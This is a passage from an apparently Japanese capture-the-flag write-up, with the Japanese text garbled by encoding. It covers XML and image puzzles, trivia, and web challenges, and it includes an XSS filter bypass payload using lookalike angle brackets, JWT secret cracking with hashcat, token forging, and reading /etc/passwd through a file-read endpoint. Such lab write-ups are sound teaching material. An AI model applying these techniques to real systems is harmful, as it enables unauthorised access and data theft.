class="keyword">for</span> cookie <span class="keyword">in</span> cookies:</span><br><span class="line">            <span class="comment"># 5. cookie:kind å±æ€§ã‹ã‚™ icing ã¦ã‚™ã‚ã‚Š...</span></span><br><span class="line">            <span class="keyword">if</span> cookie.get(<span class="string">&quot;&#123;http://xml.vlc-cybercontest.com/cookie&#125;kind&quot;</span>) == <span class="string">&quot;icing&quot;</span>:</span><br><span class="line">                radius = <span class="built_in">float</span>(</span><br><span class="line">                    cookie.get(<span class="string">&quot;&#123;http://xml.vlc-cybercontest.com/cookie&#125;radius&quot;</span>).rstrip(</span><br><span class="line">                        <span class="string">&quot;cm&quot;</span></span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">                <span class="comment"># ã‹ã¤ cookie:radius å±æ€§ã‹ã‚™ 3.0cm ä»¥ä¸Šã®å­è¦ç´  sweets:cookie ã‚’å°‘ãªãã¨ã‚‚ä¸€ã¤å«ã‚€</span></span><br><span class="line">                <span class="keyword">if</span> radius &gt;= <span class="number">3.0</span>:</span><br><span class="line">                    [</span><br><span class="line">                        <span class="built_in">print</span>(ET.tostring(cookie, encoding=<span class="string">&quot;unicode&quot;</span>))</span><br><span class="line">                        <span class="keyword">for</span> cookie <span class="keyword">in</span> cookies</span><br><span class="line">                    ]</span><br><span class="line"></span><br><span class="line">parse_sweets(<span class="string">&quot;sweets.xml&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>â†“ã®å®Ÿè¡Œçµæœã‚’ä¸Šã‹ã‚‰è©¦ã™ã¨ãƒ•ãƒ©ã‚°ã ã£ãŸã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">% python solve.py</span><br><span class="line">&lt;sweets:cookie xmlns:sweets=<span class="string">&quot;http://xml.vlc-cybercontest.com/sweets&quot;</span> xmlns:cookie=<span class="string">&quot;http://xml.vlc-cybercontest.com/cookie&quot;</span> xmlns:icecream=<span class="string">&quot;http://xml.vlc-cybercontest.com/icecream&quot;</span> xmlns:candy=<span class="string">&quot;http://xml.vlc-cybercontest.com/candy&quot;</span> cookie:<span class="built_in">id</span>=<span class="string">&quot;0x6937BAA7&quot;</span> cookie:kind=<span class="string">&quot;languedechat&quot;</span> cookie:radius=<span class="string">&quot;3.1418079cm&quot;</span>&gt;**flag&#123;sZ8d5FbntXbL9uwP&#125;**&lt;/sweets:cookie&gt;</span><br><span class="line"></span><br><span class="line">&lt;sweets:cookie xmlns:sweets=<span class="string">&quot;http://xml.vlc-cybercontest.com/sweets&quot;</span> xmlns:cookie=<span class="string">&quot;http://xml.vlc-cybercontest.com/cookie&quot;</span> xmlns:icecream=<span class="string">&quot;http://xml.vlc-cybercontest.com/icecream&quot;</span> xmlns:candy=<span class="string">&quot;http://xml.vlc-cybercontest.com/candy&quot;</span> cookie:<span class="built_in">id</span>=<span class="string">&quot;0x19A83890&quot;</span> cookie:kind=<span class="string">&quot;checker&quot;</span> cookie:radius=<span class="string">&quot;3.0552874cm&quot;</span>&gt;flag&#123;QxNFv5q9gtnvaXEc&#125;&lt;/sweets:cookie&gt;</span><br><span class="line"></span><br><span class="line">&lt;sweets:cookie xmlns:sweets=<span class="string">&quot;http://xml.vlc-cybercontest.com/sweets&quot;</span> xmlns:cookie=<span class="string">&quot;http://xml.vlc-cybercontest.com/cookie&quot;</span> xmlns:icecream=<span class="string">&quot;http://xml.vlc-cybercontest.com/icecream&quot;</span> xmlns:candy=<span class="string">&quot;http://xml.vlc-cybercontest.com/candy&quot;</span> cookie:<span class="built_in">id</span>=<span class="string">&quot;0xB43E03AC&quot;</span> cookie:kind=<span class="string">&quot;icing&quot;</span> cookie:radius=<span class="string">&quot;3.1110701cm&quot;</span>&gt;flag&#123;YXBbN3zpqxJy8CvA&#125;&lt;/sweets:cookie&gt;</span><br><span class="line"></span><br><span class="line">&lt;sweets:cookie xmlns:sweets=<span class="string">&quot;http://xml.vlc-cybercontest.com/sweets&quot;</span> xmlns:cookie=<span class="string">&quot;http://xml.vlc-cybercontest.com/cookie&quot;</span> xmlns:icecream=<span class="string">&quot;http://xml.vlc-cybercontest.com/icecream&quot;</span> xmlns:candy=<span class="string">&quot;http://xml.vlc-cybercontest.com/candy&quot;</span> cookie:<span class="built_in">id</span>=<span class="string">&quot;0x9F045677&quot;</span> cookie:kind=<span class="string">&quot;checker&quot;</span> cookie:radius=<span class="string">&quot;3.0090029cm&quot;</span>&gt;flag&#123;28j3vnedw7BELQxU&#125;&lt;/sweets:cookie&gt;</span><br></pre></td></tr></table></figure>

<aside>
â›³ flag{sZ8d5FbntXbL9uwP}

</aside>

<h3><span id="twisted-text">Twisted Text</span></h3><img src="/img/2024/02-25/Untitled%2034.png" width="550px" height="auto">

<p>Copilotã€œã€œã€œ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Twisted.png ã‚’ãƒ”ã‚¯ã‚»ãƒ«ã”ã¨ã«å‡¦ç†ã—ã¦ã€fixed-Twisted.png ã‚’ä½œã£ã¦ä¿å­˜ã—ã¦ãã ã•ã„ã€‚</span><br><span class="line"></span><br><span class="line">ãŸã ã—ã€ Twisted.png ã¯ã€ç”»åƒã®ä¸­å¿ƒã‹ã‚‰ã®è·é›¢ r [pixel] ã«å¯¾ã—ã¦</span><br><span class="line"></span><br><span class="line">Î¸ = - (r ^ <span class="number">2</span>) / (<span class="number">250</span> ^ <span class="number">2</span>) [rad]</span><br><span class="line">ãŸã‚™ã‘å›è»¢ã•ã‚Œã¦ã„ã¾ã™(åæ™‚è¨ˆå›ã‚Šã‚’æ­£ã¨ã—ã¾ã™)ã€‚é€†å¤‰æ›ã‚’æ–½ã—ã¦ fixed-Twsited.png ã‚’ä½œã£ã¦ãã ã•ã„ã€‚</span><br></pre></td></tr></table></figure>

<p>ã¾ã‚ã¾ã‚ãªã‚³ãƒ¼ãƒ‰ã‚’æ›¸ã„ã¦ãã‚ŒãŸãŒã€åº§æ¨™å›è»¢ã®å¼ã‚’é–“é•ãˆã¦ã„ãŸã‚Šã—ãŸã€‚ä¿®æ­£ã—ãŸã®ãŒâ†“</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rotate_image</span>(<span class="params">image_path, output_path</span>):</span><br><span class="line">    <span class="comment"># ç”»åƒã‚’é–‹ã</span></span><br><span class="line">    img = Image.<span class="built_in">open</span>(image_path)</span><br><span class="line">    width, height = img.size</span><br><span class="line">    pixels = np.array(img)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ–°ã—ã„ç”»åƒã®ãƒ”ã‚¯ã‚»ãƒ«ã‚’æ ¼ç´ã™ã‚‹é…åˆ—ã‚’ä½œæˆ</span></span><br><span class="line">    new_pixels = np.zeros_like(pixels)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç”»åƒã®ä¸­å¿ƒã‚’è¨ˆç®—</span></span><br><span class="line">    center_x, center_y = width / <span class="number">2</span>, height / <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># å„ãƒ”ã‚¯ã‚»ãƒ«ã«å¯¾ã—ã¦</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            <span class="comment"># ä¸­å¿ƒã‹ã‚‰ã®è·é›¢ã‚’è¨ˆç®—</span></span><br><span class="line">            dx, dy = x - center_x, y - center_y</span><br><span class="line">            r = np.sqrt(dx**<span class="number">2</span> + dy**<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># è§’åº¦ã‚’è¨ˆç®—</span></span><br><span class="line">            theta =  -(r**<span class="number">2</span>) / (<span class="number">250</span>**<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># æ–°ã—ã„ä½ç½®ã‚’è¨ˆç®—</span></span><br><span class="line">            new_x = center_x + (x - center_x) * np.cos(theta) - (y - center_y) * np.sin(theta)</span><br><span class="line">            new_y = center_y + (x - center_x) * np.sin(theta) + (y - center_y) * np.cos(theta)</span><br><span class="line"></span><br><span class="line"><span class="comment">#            print(f&quot;(&#123;x&#125;, &#123;y&#125;) -&gt; (&#123;new_x&#125;, &#123;new_y&#125;)&quot;)</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># æ–°ã—ã„ä½ç½®ãŒç”»åƒã®ç¯„å›²å†…ã«ã‚ã‚‹å ´åˆã€ãƒ”ã‚¯ã‚»ãƒ«ã‚’ç§»å‹•</span></span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt;= new_x &lt; width <span class="keyword">and</span> <span class="number">0</span> &lt;= new_y &lt; height:</span><br><span class="line">                new_pixels[<span class="built_in">int</span>(new_y), <span class="built_in">int</span>(new_x)] = pixels[y, x]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ–°ã—ã„ç”»åƒã‚’ä½œæˆã—ã¦ä¿å­˜</span></span><br><span class="line">    new_img = Image.fromarray(new_pixels)</span><br><span class="line">    new_img.save(output_path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># é–¢æ•°ã‚’å‘¼ã³å‡ºã™</span></span><br><span class="line">rotate_image(<span class="string">&quot;Twisted.png&quot;</span>, <span class="string">&quot;fixed-Twisted.png&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>å‡ºåŠ›ç”»åƒã¯â†“</p>
<img src="/img/2024/02-25/Untitled%2035.png" width="auto" height="auto">

<aside>
â›³ flag{LHZGhq3WTXvo}

</aside>

<h2><span id="trivia">Trivia</span></h2><h3><span id="the-original-name-of-aes">The Original Name of AES</span></h3><img src="/img/2024/02-25/Untitled%2036.png" width="550px" height="auto">

<aside>
â›³ flag{Rijndael}

</aside>

<h3><span id="cve-record-of-lowest-number">CVE Record of Lowest Number</span></h3><img src="/img/2024/02-25/Untitled%2037.png" width="550px" height="auto">

<p>ã‚°ã‚°ã‚‹ã¨ã€CVEã¯1999å¹´ã‹ã‚‰å§‹ã¾ã£ãŸæ¨¡æ§˜ã€‚ã¨ã„ã†ã“ã¨ã¯ CVE-1999-0001 ã‹ãªï¼Ÿ</p>
<p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-1999-0001">https://nvd.nist.gov/vuln/detail/CVE-1999-0001</a></p>
<p>ã‚ã‚Šã¾ã—ãŸã€‚exploitãŒã‚ã‚Šãã†ãªãƒªãƒ³ã‚¯ã‚’è¾¿ã‚‹ã¨â†“ã‚’ç™ºè¦‹ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://ftp.openbsd.org/pub/OpenBSD/patches/2.3/common/tcpfix.patch">https://ftp.openbsd.org/pub/OpenBSD/patches/2.3/common/tcpfix.patch</a></p>
<p>ãƒ‘ãƒƒãƒä¸­ã®ãƒ•ã‚¡ã‚¤ãƒ«åã‹ã‚‰ã€</p>
<aside>
â›³ flag{ip_input.c}

</aside>

<h3><span id="mfa-factors">MFA Factors</span></h3><img src="/img/2024/02-25/Untitled%2038.png" width="550px" height="auto">

<p>ã‚ãƒ¼ã‚ã‚Œã§ã—ã‚‡ï¼Ÿã‚ã‚Œã‚ã‚Œ</p>
<ul>
<li>çŸ¥è­˜</li>
<li>ä½“</li>
<li>æ‰€æœ‰</li>
</ul>
<p>ãªã‚“ã‹ã†ã‚è¦šãˆâ€¦ ã‚°ã‚°ã£ã¦å›ç­”ã€‚</p>
<aside>
â›³ flag{æ‰€æŒãƒ»ç”Ÿä½“ãƒ»çŸ¥è­˜}

</aside>

<h2><span id="web">Web</span></h2><h3><span id="browsers-have-local-storage">Browsers Have Local Storage</span></h3><img src="/img/2024/02-25/Untitled%2039.png" width="550px" height="auto">

<p><code>/</code> ã‹ã‚‰èª­ã¾ã‚Œã¦ã„ã‚‹JSãƒ•ã‚¡ã‚¤ãƒ«ã«ãƒ•ãƒ©ã‚°ã‚ã‚Šã€‚</p>
<img src="/img/2024/02-25/Untitled%2040.png" width="auto" height="auto">

<aside>
â›³ FLAG{Th1s_1s_The_fIrst_flag}

</aside>

<h3><span id="are-you-introspective">Are You Introspective?</span></h3><img src="/img/2024/02-25/Untitled%2041.png" width="550px" height="auto">

<p>Burp Suite Certified Practitioner è³‡æ ¼ã®ç·´ç¿’ã§æ­»ã¬ã»ã©ã‚„ã£ãŸã€‚</p>
<p><a target="_blank" rel="noopener" href="https://laysakura.notion.site/Web-hack-Recon-044e89072597493b93e00cfd530019bb#eab8dcf67d7f4e8e8920fbb6e96d255f">Fuzz: Information disclosure &#x2F; Access control &#x2F; GraphQL (hidden api) &#x2F; JWT &#x2F; OAuth - Notion</a></p>
<p>ã“ã“ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆå€™è£œã‚’Burp Intruderã§ãƒãƒãƒã¨è©¦ã™ã¨ã€ <code>/v1/graphql</code> ã§ã„ã„æ„Ÿã˜ã®ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãŒè¿”ã£ã¦ãã‚‹ã€‚</p>
<p>ãƒ–ãƒ©ã‚¦ã‚¶ã§ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€å‹æ‰‹ã«ã‚¤ãƒ³ãƒˆãƒ­ã‚¹ãƒšã‚¯ã‚·ãƒ§ãƒ³ã‚¯ã‚¨ãƒªã‚’POSTã§æŠ•ã’ã¦ãã‚Œã‚‹ã€‚Graph<em>i</em>QLã®JSãŒã‚„ã£ã¦ãã‚Œã¦ã‚‹ã®ã‹ãªï¼Ÿ</p>
<p>POSTã®ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«ãƒ•ãƒ©ã‚°ãŒå«ã¾ã‚Œã¦ã„ã‚‹ã€‚</p>
<img src="/img/2024/02-25/Untitled%2042.png" width="auto" height="auto">

<aside>
â›³ FLAG{Is_this_your_first_time_using_GraphQL}

</aside>

<h3><span id="insecure">Insecure</span></h3><img src="/img/2024/02-25/Untitled%2043.png" width="550px" height="auto">

<p>ã¾ãšã¯ä¸ãˆã‚‰ã‚ŒãŸ testUser ã§ãƒ­ã‚°ã‚¤ãƒ³ã€‚</p>
<p>ãƒãƒãƒãƒã‚„ã£ã¦ã€ãƒ—ãƒ­ãƒ•ã‚£ãƒ¼ãƒ«ã‚’è¡¨ç¤ºã€‚ã“ã‚“ãªæ„Ÿã˜ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆâ†’ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã€‚</p>
<img src="/img/2024/02-25/Untitled%2044.png" width="auto" height="auto">

<p>ç„¡é‚ªæ°—ã« <code>id=0</code> ã¨ã‚„ã£ã¦Repeatã™ã‚‹ã¨ã€ <code>profile_error.php</code> ã«ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã•ã‚Œã¦ã—ã¾ã†ã€‚</p>
<img src="/img/2024/02-25/Untitled%2045.png" width="auto" height="auto">

<p>ï¼ˆè‰²ã€…è©¦è¡ŒéŒ¯èª¤ã—ã¦ãµã¨æ°—ã¥ãï¼‰ã“ã‚Œã€å¤±æ•—ã¯ã—ã¦ã‚‚ <code>profile_success.php</code> ã¯è£å´ã®å‡¦ç†ã§ç”Ÿæˆã•ã‚Œã¦ã„ã‚‹ã®ã§ã¯ï¼Ÿãƒ¦ãƒ¼ã‚¶ãƒ¼ã”ã¨ã«ã‚¹ã‚³ãƒ¼ãƒ”ãƒ³ã‚°ã—ã¦ãªã„ã‹ã‚‚ã€‚ã¨æ€ã„è‡³ã‚‹ã€‚</p>
<p>ãƒ“ãƒ³ã‚´ã€‚</p>
<img src="/img/2024/02-25/Untitled%2046.png" width="auto" height="auto">

<p>ãƒœãƒ‡ã‚£ã®ä¸‹ã®æ–¹ã«ãƒ•ãƒ©ã‚°ãŒã‚ã‚‹ï¼ˆå€‹äººæƒ…å ±ã«è¦‹ãˆã‚‹æ–‡å­—åˆ—è¦‹ãˆã¡ã‚ƒã†ã®ã§ä¸Šã ã‘åˆ‡ã‚Šå‡ºã—ãŸï¼‰ã€‚</p>
<aside>
â›³ FLAG{1qaz7ujmbgt5}

</aside>

<h3><span id="variation-è§£ã‘ãªã‹ã£ãŸ">Variation (è§£ã‘ãªã‹ã£ãŸ ğŸ˜­)</span></h3><img src="/img/2024/02-25/Untitled%2047.png" width="550px" height="auto">

<p><code>&lt;</code> ã¨ <code>&gt;</code> ãŒæ¶ˆã•ã‚Œã¦ã—ã¾ã†ã®ã§ã€JSã‚’æ›¸ã‘ã‚‹æ–‡è„ˆã«æŒã¡è¾¼ã‚ãªã„ã€‚å…¨è§’ã® <code>ï¼œ</code> ãªã©è‰²ã€…è©¦ã™ãŒã†ã¾ãã„ã‹ãšã€‚</p>
<p><a target="_blank" rel="noopener" href="https://nanimokangaeteinai.hateblo.jp/entry/2024/02/25/210059#Web-20-Variation-6-solves">é˜²è¡›çœã‚µã‚¤ãƒãƒ¼ã‚³ãƒ³ãƒ†ã‚¹ãƒˆ 2024 writeup - st98 ã®æ—¥è¨˜å¸³ - ã‚³ãƒ”ãƒ¼</a></p>
<p>ã®writeupè¦‹ã‚‹ã¨ã€UTF-8ã¨ã„ã†ã“ã¨ã§3ãƒã‚¤ãƒˆç·å½“ãŸã‚Šã—ã¦ã„ã‚‹ã€‚è³¢ã„â€¦</p>
<p><code>ï¹¤</code> ã¨ <code>ï¹¥</code> ãŒä½¿ãˆã‚‹æ¨¡æ§˜ã€‚</p>
<p><a target="_blank" rel="noopener" href="http://10.10.10.32/greet?name=%EF%B9%A4script%EF%B9%A5alert(1)%EF%B9%A4/script%EF%B9%A5">http://10.10.10.32/greet?name=ï¹¤scriptï¹¥alert(1)ï¹¤/scriptï¹¥</a></p>
<p>ã§ãƒ•ãƒ©ã‚°ã‚²ãƒƒãƒˆã€‚</p>
<img src="/img/2024/02-25/Untitled%2048.png" width="auto" height="auto">

<aside>
â›³ FLAG{dfa23afjkl98}

</aside>

<h3><span id="bruteforce">Bruteforce</span></h3><img src="/img/2024/02-25/Untitled%2049.png" width="550px" height="auto">

<p>å¥½ããªå•é¡Œã€‚</p>
<p>:8000 ã®æ–¹ã¯Basicèªè¨¼ã®æ‰‹ãŒã‹ã‚ŠãŒãªã„ã®ã§ã€ :5000 ã®æ–¹ã‚’ã‚½ãƒ¼ã‚¹ã‹ã‚‰è¦‹ã¦ã¿ã‚‹ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> jsonify</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask_jwt_extended <span class="keyword">import</span> create_access_token</span><br><span class="line"><span class="keyword">from</span> flask_jwt_extended <span class="keyword">import</span> get_jwt_identity</span><br><span class="line"><span class="keyword">from</span> flask_jwt_extended <span class="keyword">import</span> jwt_required</span><br><span class="line"><span class="keyword">from</span> flask_jwt_extended <span class="keyword">import</span> JWTManager</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&quot;JWT_SECRET_KEY&quot;</span>] = <span class="string">&quot;*************&quot;</span></span><br><span class="line">app.config[<span class="string">&quot;JWT_ACCESS_TOKEN_EXPIRES&quot;</span>] = <span class="literal">False</span></span><br><span class="line">app.config[<span class="string">&quot;JWT_REFRESH_TOKEN_EXPIRES&quot;</span>] = <span class="literal">False</span></span><br><span class="line">app.config[<span class="string">&quot;JWT_COOKIE_CSRF_PROTECT&quot;</span>] = <span class="literal">False</span></span><br><span class="line">app.config[<span class="string">&quot;JWT_ENCODE_NBF&quot;</span>] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">jwt = JWTManager(app)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    users = &#123;&#125;</span><br><span class="line">    users[<span class="string">&#x27;test&#x27;</span>] = <span class="string">&#x27;test&#x27;</span></span><br><span class="line">    users[<span class="string">&#x27;admin&#x27;</span>] = <span class="string">&#x27;*************&#x27;</span></span><br><span class="line">    username = request.json.get(<span class="string">&quot;username&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="built_in">print</span>(username)</span><br><span class="line">    password = request.json.get(<span class="string">&quot;password&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="built_in">print</span>(password)</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> username <span class="keyword">in</span> users) <span class="keyword">or</span> (password != users[username]):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Bad username or password&quot;</span>&#125;), <span class="number">401</span></span><br><span class="line"></span><br><span class="line">    access_token = create_access_token(identity=username)</span><br><span class="line">    <span class="keyword">return</span> jsonify(access_token=access_token)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/protected&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@jwt_required()</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">protected</span>():</span><br><span class="line">    current_user = get_jwt_identity()</span><br><span class="line">    <span class="keyword">if</span> current_user == <span class="string">&quot;test&quot;</span> :</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ummm....&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> current_user == <span class="string">&quot;admin&quot;</span> :</span><br><span class="line">        filepath = request.json.get(<span class="string">&quot;filepath&quot;</span>,<span class="literal">None</span>)</span><br><span class="line">        f = <span class="built_in">open</span>(filepath,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        filedata = f.read()</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">return</span> jsonify(filedata), <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>JWTå•é¡Œã¨ã‚ã‹ã‚‹ã€‚ã¨ã‚Šãˆã‚ãš <code>test:test</code> ã§ãƒ­ã‚°ã‚¤ãƒ³ã§ããã†ãªã®ã§ãƒªã‚¯ã‚¨ã‚¹ãƒˆã€‚</p>
<img src="/img/2024/02-25/Untitled%2050.png" width="auto" height="auto">

<p>JWTã®ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ãŒã‚‚ã‚‰ãˆãŸã€‚ã“ã‚Œã‚’ Authorization ãƒ˜ãƒƒãƒ€ã«ä½¿ã£ã¦ <code>/protected</code> ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã¿ã‚‹ã€‚</p>
<img src="/img/2024/02-25/Untitled%2051.png" width="auto" height="auto">

<p>ã‚½ãƒ¼ã‚¹ã‹ã‚‰æœŸå¾…ã•ã‚Œã‚‹ã‚ˆã†ã«ã€ ummmm ã—ã¦ã‚‚ã‚‰ã£ãŸã€‚</p>
<p>JWTã®ä¸­èº«ã¯ã“ã‚“ãªæ„Ÿã˜ã€‚</p>
<img src="/img/2024/02-25/Untitled%2052.png" width="auto" height="auto">

<p><a target="_blank" rel="noopener" href="https://laysakura.notion.site/Web-hack-Exploit-2c68c0d3131c427aab94e82ae49366ec#8fbb303a58be4c769720f3e5cd072861">[server] JWT attacks - Notion</a> ã«ã¾ã¨ã‚ãŸã„ã‚ã„ã‚ãªæ”»æ’ƒã‚’è©¦ã™ãŒã€å•é¡Œã‚¿ã‚¤ãƒˆãƒ«çš„ã«ã‚‚æœ¬å‘½ã¯ <a target="_blank" rel="noopener" href="https://laysakura.notion.site/Web-hack-Exploit-2c68c0d3131c427aab94e82ae49366ec#86d4ae8ce83e4d0cb4e3f80a0e4050a4">Exploit: ç§˜å¯†éµã«brute force &#x2F; è¾æ›¸æ”»æ’ƒ - Notion</a> ã€‚</p>
<p>å…ˆã»ã©å¾—ãŸ <code>test:test</code> ã®JWTã§ç§˜å¯†éµã‚’æ¢ã™ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% hashcat -a <span class="number">0</span> -m <span class="number">16500</span> <span class="string">&#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTcwODg0OTA1NSwianRpIjoiMGZkY2NlZjQtZmFmNi00ZjQ1LThiODgtNWU4Y2VhMWZhOTlkIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlc3QifQ.G5nYLH6uv37IdJRGw9FFrDBa_TBGliO4dlKsFvEVzcQ&#x27;</span> /usr/share/wordlists/rockyou.txt --show</span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTcwODg0OTA1NSwianRpIjoiMGZkY2NlZjQtZmFmNi00ZjQ1LThiODgtNWU4Y2VhMWZhOTlkIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlc3QifQ.G5nYLH6uv37IdJRGw9FFrDBa_TBGliO4dlKsFvEVzcQ:**conankun**</span><br></pre></td></tr></table></figure>

<p><code>conankun</code> ãŒã‚­ãƒ¼<code>ã€‚</code></p>
<p>ã“ã‚Œä½¿ã£ã¦ã€ <code>&quot;sub&quot;</code> ã‚’ <code>admin</code> ã«å¤‰ãˆãŸJWTã‚’ä½œã£ã¦é€ä¿¡ã™ã‚‹ã‚‚ã€500â€¦</p>
<img src="/img/2024/02-25/Untitled%2053.png" width="auto" height="auto">

<hr>
<p>æ”¹ã‚ã¦ã‚³ãƒ¼ãƒ‰ã‚’èª­ã‚€ã¨ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒœãƒ‡ã‚£ã®JSONã« <code>filepath</code> ã‚’æŒ‡å®šã—ãªã„ã¨ç¢ºã‹ã«ã‚µãƒ¼ãƒãƒ¼ã‚¨ãƒ©ãƒ¼ã«ãªã‚Šãã†ã€‚</p>
<p>ã—ã‹ã—ãƒ•ãƒ©ã‚°ã®pathãŒã‚ã‹ã‚‰ãªã„ã€‚</p>
<p>ä¸€æ—¦ <code>&#123;&quot;filepath&quot;: &quot;/etc/passwd&quot;&#125;</code> ã¨ã‹ã«ã™ã‚‹ã¨ã€ã¡ã‚ƒã‚“ã¨ä¸­èº«ãŒãƒ¬ã‚¹ãƒãƒ³ã‚¹ã•ã‚Œã‚‹ã€‚</p>
<p>ãƒ•ã‚¡ã‚¤ãƒ«readã‹ã‚‰ãƒ•ãƒ©ã‚°ãƒ‘ã‚¹æƒ…å ±åé›†ã¨ãªã‚‹ã¨ã€ã†ãƒ¼ã‚“ <code>/proc/self/</code> ä½¿ãˆã‚‹ã‹ãªãã€‚</p>
